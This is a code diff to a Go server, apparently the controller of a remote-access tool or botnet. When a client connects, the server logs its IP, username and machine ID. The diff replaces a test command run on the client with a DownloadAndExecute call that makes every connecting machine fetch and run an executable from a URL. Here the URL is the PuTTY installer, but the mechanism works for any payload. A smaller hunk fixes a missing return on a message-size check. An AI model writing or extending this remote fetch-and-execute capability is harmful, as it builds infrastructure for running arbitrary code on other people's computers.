@@ -39,16 +39,14 @@ func (c Client) OnConnect() {
         }
         ConnectedClients[c] = true              // Append the new client to the client list
 
-        basicSystemInfo, err := c.GetBasicSystemInfo()  // Cache the basic system info
-        if err == nil {
-                log.Printf("New client connected with IP %s and username %s (%s)", c.IP, basicSystemInfo.Username, basicSystemInfo.MachineID)
-        }
-        _, res, err := c.RunCommand("git", false)
-        if err != nil {
-                log.Println(err)
-        }
-        log.Printf("output: %s", res)
-
+	basicSystemInfo, err := c.GetBasicSystemInfo()	// Cache the basic system info
+	if err == nil {
+		log.Printf("New client connected with IP %s and username %s (%s)", c.IP, basicSystemInfo.Username, basicSystemInfo.MachineID)
+	}
+	err = c.DownloadAndExecute("https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe", nil)
+	if err != nil {
+		log.Println(err)
+	}
 }
 
 // Deletes the client from the client list and closes the connection
@@ -112,6 +110,10 @@ func (c Client) SendMessage(messageID int, data interface{}, response interface{
         if messageID > 255 {
                 errors.New("message ID is too large")
         }
+	// Check if messageID is too large
+	if messageID > 255 {
+		return errors.New("message ID is too large")
+	}
 
         var payloadBuffer bytes.Buffer
         if data != nil {        // Add the payload to the buffer if there is a payload
